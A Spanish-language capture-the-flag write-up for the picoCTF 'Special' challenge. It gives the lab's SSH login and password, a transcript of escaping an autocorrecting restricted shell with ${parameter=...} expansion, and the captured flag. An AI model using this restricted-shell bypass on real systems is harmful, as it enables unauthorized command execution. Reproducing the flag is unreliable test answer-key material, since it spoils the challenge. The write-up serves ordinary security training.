## Special

¿Los usuarios avanzados no se cansan de cometer errores ortográficos en el shell? ¡Ya no! Presentamos Special, la interfaz de corrección ortográfica para Linux. Ahora, cada palabra está escrita y capitalizada correctamente... ¡automáticamente y en segundo plano! Sea el primero en probar Special en versión beta y no dude en contarnos todo sobre cómo Special agiliza cada proceso de desarrollo al que se enfrenta. Cuando sus compañeros de trabajo vean su increíble interfaz de shell, dígales: Eso es Special (TM)Inicie su instancia para ver los detalles de la conexión.`ssh -p 55436 ctf-player@saturn.picoctf.net`La contraseña es`3f39b042`

Hints:
1. Experimente con diferentes sintaxis de shell


## Solución:

```

grbau21-picoctf@webshell:~$ ssh -p 55436 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:55436 ([13.59.203.175]:55436)' can't be established.
ED25519 key fingerprint is SHA256:tJ0wuU5yBvNO/FrkHmR9iY36VJClMhKV+Hq2sxqKFmg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:10: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:55436' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Special$ ls
Is 
sh: 1: Is: not found
Special$ whoami
Whom 
sh: 1: Whom: not found
Special$ pwd
Pod 
sh: 1: Pod: not found
Special$ cat
Cat 
sh: 1: Cat: not found

--Usando esto
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cd blargh}
${parameter=cd blargh} 
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt} 
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_f906e25a}Special$


picoCTF{5p311ch3ck_15_7h3_w0r57_f906e25a}

```
